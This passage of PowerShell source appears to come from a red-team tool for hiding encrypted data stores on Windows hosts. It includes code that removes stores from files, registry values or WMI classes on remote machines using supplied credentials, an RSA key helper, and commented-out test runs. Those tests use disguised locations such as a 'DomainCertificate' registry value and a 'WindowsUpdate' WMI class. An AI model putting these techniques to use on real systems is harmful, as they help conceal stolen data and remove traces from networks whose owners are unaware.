                if(($Store -match '^[A-Z]:\\') -or ($Store -match '^\\\\[A-Z0-9]+\\[A-Z0-9]+')) {
                    # file on a disk, local or remote, or \\UNC path

                    if($Computer -ne 'localhost') {
                        # remote -ComputerName specification
                        $Net = New-Object -ComObject WScript.Network

                        $PathParts = $Store.Replace(':', '$').Split('\')
                        $UNCPath = "\\$ComputerName\$($PathParts[0..($PathParts.Length-2)] -join '\')"
                        $FileName = $PathParts[-1]

                        if($PSBoundParameters['Credential']) {
                            try {
                                # map a temporary network drive with the credentials supplied
                                # this is because New-PSDrive in PowerShell v2 doesn't support alternate credentials :(
                                Write-Verbose "[$Computer] Mapping drive Z: to '$UNCPath'"
                                $Net.MapNetworkDrive("Z:", $UNCPath, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                                $EncStorePath = "Z:\$FileName"
                            }
                            catch {
                                throw "[$Computer] Error mapping path '$Store' : $_"
                            }
                        }
                        else {
                            $EncStorePath = "$UNCPath\$FileName"
                        }
                    }
                    else {
                        # plain old localhost
                        $EncStorePath = Resolve-Path -Path $Store
                    }

                    try {
                        $Null = Remove-Item -Path $EncStorePath -Force
                    }
                    catch {
                        Write-Warning "[$Computer] Error removing file '$EncStorePath' : $_"
                    }

                    if($Computer -ne 'localhost' -and ($PSBoundParameters['Credential'])) {
                        try {
                            Write-Verbose "[$Computer] Unmapping drive Z:\"
                            $Net = New-Object -ComObject WScript.Network
                            $Null = $Net.RemoveNetworkDrive('Z:', $True)
                        }
                        catch {
                            Write-Verbose "[$Computer] Error unmapping drive Z:\ : $_"
                        }
                    }
                }
                elseif($Store -match '^(HKCR|HKCU|HKLM|HKU|HKCC):\\') {
                    # registry storage

                    $RegistryParts = $Store.Split('\')
                    $KeyName = ($RegistryParts[0..($RegistryParts.Length - 2)]) -join '\'
                    $ValueName = $RegistryParts[-1]

                    if($Computer -ne 'localhost') {
                        # remote registry storage - logic heavily adopted from @mattifestation's Invoke-WmiCommand.ps1 logic

                        $WmiMethodArgs['ComputerName'] = $Computer

                        $RegistryKeyParts = $KeyName.Split('\')
                        $RegistryKeyPath = $RegistryKeyParts[1..($RegistryKeyParts.Length)] -join '\'

                        switch ($RegistryKeyParts[0]) {
                            'HKLM:' { $Hive = 2147483650 }
                            'HKCU:' { $Hive = 2147483649 }
                            'HKCR:' { $Hive = 2147483648 }
                            'HKU:' { $Hive = 2147483651 }
                            'HKCC:' { $Hive = 2147483653 }
                        }

                        $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList @($Hive, $RegistryKeyPath, $ValueName) -ErrorAction Stop

                        if ($Result.ReturnValue -ne 0) {
                            Write-Warning "[$Computer] Unable delete store data from the following registry value: $Store"
                        }
                    }
                    else {
                        # localhost registry storage
                        try {
                            $Null = Remove-ItemProperty -Path $KeyName -Name $ValueName -Force -ErrorAction Stop
                        }
                        catch {
                            Write-Warning "[$Computer] Exception removing registry value '$Store' : $_"
                        }
                    }
                }
                elseif($Store -match '^[A-Z0-9]*\\.*:[A-Z0-9]+$') {
                    # WMI storage

                    try {
                        if($Computer -ne 'localhost') {
                            $StoreParts = $Store.Split(':')
                            $Namespace = $StoreParts[0]
                            $Class = $StoreParts[1]

                            $WmiMethodArgs['ComputerName'] = $Computer

                            $Null = Remove-WmiObject @WmiMethodArgs -Class $Class -Namespace $Namespace
                        }
                        else {
                            $Null = [WmiClass] $Store | Remove-WmiObject
                        }
                    }
                    catch {
                        Write-Warning "[$Computer] Exception removing WMI class '$Store' : $_"
                    }
                }
                else {
                    throw "[$Computer] Invalid StorePath format: $Store"
                }
            }
        }
    }
}


function New-RSAKeyPair {
<#
    .SYNOPSIS

        Helper that returns XML-exported strings representing the public/private components of
        a randomly generated RSA key pair.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Wraps the System.Security.Cryptography.RSACryptoServiceProvider to generate a RSA public/private
        key pair and returns a custom object with the XML exports of each for use in Write/Out-EncryptedStore
        and Read-EncryptedStore.

    .EXAMPLE

        PS C:\> $RSA = New-RSAKeyPair
        PS C:\> $RSA | Format-List

        Generates a random RSA public/private key pair and displays the XML exports of the keys.
#>

    $CSP = New-Object System.Security.Cryptography.CspParameters;
    $CSP.Flags = $CSP.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList @(1024,$CSP)

    $Pub = $RSA.ToXmlString($False)
    $Priv = $RSA.ToXmlString($True)

    $Properties = @{
        'Priv' = $Priv
        'Pub' = $Pub
    }

    New-Object -TypeName PSObject -Property $Properties
}


# # tests

# $RSA = New-RSAKeyPair

# # local tests
# $ComputerName = 'localhost'
# $StorePath = 'C:\Temp\temp.bin'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1

# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1

# $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCertificate'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1

# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1


# $StorePath = 'ROOT\Software:WindowsUpdate'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1

# $StorePath = 'ROOT\Software:WindowsUpdate'
# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore
# Start-Sleep -Seconds 1


# # remote tests
# $ComputerName = 'PRIMARY.testlab.local'
# $Credential = Get-Credential 'TESTLAB\administrator'
# $StorePath = 'C:\Temp\temp2.bin'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1

# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1


# $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'
# ".\u2.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1

# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Pub
# ".\u2.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1


# $StorePath = 'ROOT\Software:WindowsUpdate2'
# Write-Host "`n[$ComputerName] AES Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!' -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1

# Write-Host "`n[$ComputerName] RSA Storepath : $StorePath"
# ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Pub
# Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key $RSA.Priv -List
# Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential
# Start-Sleep -Seconds 1
